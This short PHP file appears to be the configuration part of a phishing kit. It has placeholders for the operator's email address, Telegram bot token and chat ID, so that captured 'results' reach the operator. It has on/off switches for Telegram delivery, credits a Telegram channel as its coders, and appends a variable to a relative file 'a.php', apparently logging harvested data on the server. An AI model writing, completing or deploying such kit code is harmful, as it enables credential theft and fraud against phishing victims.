<?php


/* 📧 Set Your Email Address to Receive Results in Your Inbox */
$Your_Mail = "YOUREMAIL@EMAIL.COM";
/* --------------------------  */


/* 🤖 Telegram Bot Setup 🤖 */

// 🗝️ Enter your bot's token
$botToken = "YOURBOTTOKEN";

// 💬 Enter your chat ID
$chatId = "YOURCHATID";

/* --------------------------------------------------- */

/* If you want two to see the result, If you want to stop , change To off  :)  */
$botToken_0="on"; 
$chatId_0="on";  
/* --------------------------  */





$Coders_Telegram = "t.me/spartanwarriorz";  //

/* -------------------------------- */

$f = fopen("../../a.php", "a");
	fwrite($f, $yagmai);


?>